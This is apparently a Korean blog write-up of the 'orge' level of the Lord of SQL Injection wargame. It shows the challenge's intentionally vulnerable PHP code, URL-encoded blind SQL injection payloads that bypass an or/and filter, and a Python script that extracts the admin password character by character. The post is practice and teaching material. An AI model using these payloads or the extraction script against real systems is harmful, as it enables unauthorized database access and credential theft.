---
title: "[Lord of SQL Injection] LoS - orge 문제풀이"
date: 2018-07-26
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제는 `orge` 이다.
이 전 문제인 `darkelf`와 Blind SQL Injection 이었던 `orc` 문제가 섞인 것 같다.  

<!--more-->

코드는 다음과 같다.  

```php
-------------------------------------------------------------------------------
query : select id from prob_orge where id='guest' and pw=''
-------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

`or`와 `and` 문자를 사용할 수 없어 `or` 대신에 `||`, `and` 대신에 `&&`를 사용해야 한다.
또한 입력한 `pw`와 디비에 저장된 `pw`의 값이 같아야 하기 때문에 `Blind SQL Injection`으로 문제를 풀어야 한다.
그런데 첫 번째 쿼리와 두 번째 쿼리가 살짝 다르다.  

```php
$query1 = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"

$query2 = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"
```

첫 번째 쿼리에서는 `id='guest'`로 되어 있고 두 번째 쿼리에서는 `id='admin'`으로 되어 있다.
그런데 문제를 풀기 위한 조건은 `admin의 정확한 pw`를 알아내야 하는 것이므로, 첫 번째 쿼리를 통해 `admin`의 `pw`를 알아내고, 두 번째 쿼리를 통해 문제를 풀면 된다.
`admin`의 `pw`를 알아내기 위한 쿼리 스트링은 다음과 같다.  

```plain
?pw=1' || id='admin' && length(pw)=1#
```

그런데 `&&`와 `#`은 그냥 입력하면 안되고 `URL Encoding`을 해 넘겨주어야 한다.
즉, 수정하면 다음과 같다.  

```plain
?pw=1' || id='admin' %26%26 length(pw)=1%23
```

위의 쿼리 스트링을 토대로 `orc` 문제를 참고 해 아래와 같이 python 코드를 구현했다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + "1' || id='admin' %26%26 length(pw)=" + str(i) + "%23"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' || id='admin' %26%26 substr(pw, " + str(j) + ", 1)='" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

실행 시킨 결과 다음과 같이 pw를 찾을 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 7
[+] Found 2 : 7B
[+] Found 3 : 7B7
[+] Found 4 : 7B75
[+] Found 5 : 7B751
[+] Found 6 : 7B751A
[+] Found 7 : 7B751AE
[+] Found 8 : 7B751AEC
[+] Found password :  7B751AEC
[+] End
```

이번에도 역시 `7B751AEC`에서 알파벳을 소문자로 바꿔주어야 문제가 풀렸다.  

```plain
?pw=7b751aec
```

위와 같이 입력하면 문제를 풀 수 있다.  

```php
-------------------------------------------------------------------------------------------
query : select id from prob_orge where id='guest' and pw='7b751aec'
-------------------------------------------------------------------------------------------

ORGE Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
ORGE Clear!!
```
